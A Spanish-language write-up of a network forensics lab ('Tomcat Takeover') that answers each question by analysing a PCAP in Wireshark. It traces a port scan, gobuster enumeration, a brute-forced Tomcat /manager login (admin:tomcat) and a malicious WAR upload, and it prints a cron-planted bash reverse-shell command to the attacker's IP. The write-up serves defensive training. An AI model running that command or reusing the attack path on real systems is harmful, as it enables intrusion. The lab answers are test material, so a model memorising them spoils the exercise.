<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?font=Orbitron&size=62&duration=3000&pause=1000&color=D117AF&center=true&vCenter=true&width=1000&height=80&lines=Tomcat+Takeover+Lab" />
</p>

Analyze network traffic using Wireshark's custom columns, filters, and statistics to
identify suspicious web server administration access and potential compromise.

**Category:**

* Network Forensics

**Escenario**

El equipo de SOC ha identificado actividades sospechosas en un servidor web dentro de
la intranet de la empresa. Para comprender mejor la situación, han capturado el tráfico
de la red para su análisis. El archivo PCAP puede contener evidencia de actividades
maliciosas que llevaron al compromiso del servidor web Apache Tomcat. Su tarea es
analizar el archivo PCAP para comprender el alcance del ataque.

## Pregunta 01

**Dada la actividad sospechosa detectada en el servidor web, el archivo PCAP revela
una serie de solicitudes a través de varios puertos, lo que indica un posible
comportamiento de escaneo. ¿Puede identificar la dirección IP de origen
responsable de iniciar estas solicitudes en nuestro servidor?**

Si vamos a Estadísticas ➔ Conversaciones, vemos en la pestaña TCP que la IP 14.0.0.120
estuvo enviando paquetes a muchísimos puertos diferentes a la maquina 10.0.0.112.

**Respuesta:** `14.0.0.120`

## Pregunta 02

**En función de la dirección IP identificada asociada con el atacante, ¿puede
identificar el país del que se originaron las actividades del atacante?**

Como tenemos la IP podemos localizarla con la herramienta web IPSHU.

**Respuesta:** `China`

## Pregunta 03

**Desde el archivo PCAP, se detectaron múltiples puertos abiertos como resultado
del análisis activo del atacante. ¿Cuál de estos puertos proporciona acceso al panel
de administración del servidor web?**

Comenzamos filtrando el puerto 8080 que por defecto es el puerto alternativo HTTP.
Vemos bastantes solicitudes y ahora filtramos las respuestas.
Vemos que hubo varias solicitudes exitosas “200”, respuestas de paginas no encontradas
“404” y la mas importante que son las de acceso no autorizado “401”. El servidor Apache
Tomcat corriendo en el puerto 8080 responde con códigos HTTP 401 Unauthorized ante
peticiones a rutas de gestión (como los gestores de aplicaciones o hosts), confirmando
que el panel de administración web se encuentra activo y escuchando en ese puerto.

**Respuesta:** `8080`

## Pregunta 04

**Tras el descubrimiento de puertos abiertos en nuestro servidor, parece que el
atacante intentó enumerar y descubrir directorios y archivos en nuestro servidor
web. ¿Qué herramientas puede identificar a partir del análisis que ayudó al
atacante en este proceso de enumeración?**

Analizaremos los intentos fallidos “404” porque por lo general las herramientas de
explotación tienen estas fallas al buscar carpetas que no existen, por lo que es más
directo encontrar su huella en un paquete con ese código.
Una vez filtradas las respuestas no encontradas del servidor, se seleccionó uno de los
paquetes correspondientes desde el centro del flujo de tráfico y se reconstruyó la
conversación utilizando la opción Follow > HTTP Stream (Seguir flujo HTTP).
Al inspeccionar el texto plano de la comunicación HTTP, se analizó la cabecera de
solicitud enviada por el cliente. En una petición legítima, esta cabecera mostraría el
identificador de un navegador web comercial (como Chrome, Firefox o Edge); sin
embargo, se encontró la firma explícita de una herramienta de escaneo de seguridad en
la cabecera User-Agent:

**Respuesta:** `gobuster`

## Pregunta 05

**Después del esfuerzo por enumerar directorios en nuestro servidor web, el
atacante hizo numerosas solicitudes para identificar interfaces administrativas.
¿Qué directorio específico se relacionó con el panel de administración descubrió el
atacante?**

Para ver el directorio especifico que el atacante descubrió y estaba relacionado con el
panel de administración debemos buscar en las cuales está el código 200 y analizar los
detalles.
En request URI vemos que entro a la carpeta manager. En un entorno Apache Tomcat, la
ruta /manager (que alberga el Tomcat Web Application Manager) es el corazón
administrativo del sistema. Esta interfaz permite a los administradores iniciar, detener,
desplegar y eliminar aplicaciones web dentro del servidor.

**Respuesta:** `/manager`

## Pregunta 06

**Después de acceder al panel de administración, el atacante intentó forzar las
credenciales de inicio de sesión. ¿Puede determinar el nombre de usuario y la
contraseña correctos que el atacante utilizó con éxito para el inicio de sesión?**

Aplicamos el filtro http.authbasic. Esto filtrará la captura y mostrará únicamente los
paquetes donde el atacante intentó probar un par de usuario y contraseña. Después
vamos al último paquete de la lista ya que por lo general, cuando un ataque de fuerza
bruta automatizado encuentra la contraseña correcta, el bucle se detiene o el
comportamiento cambia. Analizamos los detalles en la sección de Hypertext Transfer
Protocol ➔ Authorization ➔ Credentials. Ahí nos aparecerá el usuario y contraseña
usadas por el atacante.

**Respuesta:** `admin:tomcat`

## Pregunta 07

**Una vez dentro del panel de administración, el atacante intentó cargar un archivo
con la intención de establecer un shell inverso. ¿Puede identificar el nombre de
este archivo malicioso a partir de los datos capturados?**

Como se intento cargar un archivo debemos analizar una solicitud POST. Así que
ponemos el siguiente filtro con la ip del atacante y solo solicitud POST.
ip.src == 14.0.0.120 && http.request.method == POST
Solo hay un paquete, así que ahí está la información que necesitamos. Damos en seguir
secuencia HTTP y analizamos:

**Respuesta:** `JXQOZY.war`

## Pregunta 08

**Después de establecer con éxito un shell inverso en nuestro servidor, el atacante
tenía como objetivo garantizar la persistencia en la máquina comprometida. A
partir del análisis, ¿puede determinar el comando específico que están
programados para ejecutar para mantener su presencia?**

En una reverse shell (shell inversa), el servidor víctima se conecta hacia la máquina del
atacante. El código hexadecimal 0x012 equivale a las banderas TCP SYN, ACK, que es
exactamente la confirmación que el atacante envía de vuelta para aceptar esa conexión
entrante. Aplicamos:
ip.src == 14.0.0.120 && tcp.flags == 0x012
Mediante el análisis del flujo de datos de la sesión (Follow TCP Stream), se reconstruyó el
historial de comandos ejecutados en la terminal interactiva. Se determinó que el
atacante implementó un mecanismo de persistencia basado en la programación de
tareas del sistema (Cron), inyectando el siguiente comando programado para su
ejecución periódica:
Esta técnica permite al atacante ejecutar código malicioso de forma recurrente en un
segundo plano, reestableciendo automáticamente el acceso no autorizado sin necesidad
de volver a explotar la vulnerabilidad inicial de la interfaz web.

**Respuesta:** `/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?font=Orbitron&size=60&duration=3000&pause=1000&color=D117AF&center=true&vCenter=true&width=1000&height=80&lines=LABORATORIO+TERMINADO" />
</p>
